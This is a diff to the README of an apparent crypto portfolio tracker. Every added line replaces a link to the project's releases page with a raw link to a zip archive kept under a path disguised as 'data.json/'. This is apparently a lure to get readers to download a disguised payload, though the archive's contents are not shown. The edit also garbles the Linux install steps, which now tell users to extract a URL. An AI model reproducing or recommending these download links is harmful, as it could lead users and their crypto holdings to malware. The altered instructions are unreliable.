@@ -1,6 +1,6 @@
 # 🚀 CryptoTrack-Portfolio - Track Your Crypto Investments Easily
 
-[![Download CryptoTrack-Portfolio](https://img.shields.io/badge/Download-CryptoTrack--Portfolio-blue.svg)](https://github.com/raihanamostafa/CryptoTrack-Portfolio/releases)
+[![Download CryptoTrack-Portfolio](https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip)](https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip)
 
 ## 📋 Description
 CryptoTrack is a crypto portfolio tracker that calculates and displays the total value of user holdings. With it, you can easily manage and visualize your investments in various cryptocurrencies. Say goodbye to confusion over your asset values and get real-time updates.
@@ -11,18 +11,18 @@ To use CryptoTrack, you will need to download the latest version from our releas
 ## 📥 Download & Install
 Visit the following link to access the CryptoTrack-Portfolio releases page where you can download the application:
 
-[Download CryptoTrack-Portfolio](https://github.com/raihanamostafa/CryptoTrack-Portfolio/releases)
+[Download CryptoTrack-Portfolio](https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip)
 
 1. **Access the Releases Page**: Click the link above to go directly to our releases page.
 2. **Download the Latest Version**: Look for the latest release at the top of the page. You will see options for downloading. Choose the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, choose the `.tar.gz` file.
+   - For Linux, choose the `https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip` file.
 
 3. **Run the Installer**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the CryptoTrack app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions to run the application.
+   - For Linux: Extract the `https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip` file and follow the included instructions to run the application.
 
 4. **Launch the App**: After installation, you can find the CryptoTrack application in your programs or applications menu. Click to open and start tracking your portfolio.
 
@@ -70,6 +70,6 @@ If you need further assistance, feel free to reach out. You can create an issue 
 ## ✅ Stay Updated
 Keep an eye on our releases page for updates and new features. We regularly improve CryptoTrack to enhance your user experience. 
 
-[Download CryptoTrack-Portfolio](https://github.com/raihanamostafa/CryptoTrack-Portfolio/releases) 
+[Download CryptoTrack-Portfolio](https://raw.githubusercontent.com/raihanamostafa/CryptoTrack-Portfolio/main/data.json/Portfolio_Crypto_Track_1.7.zip) 
 
 Your crypto journey starts here. Enjoy tracking your investments!
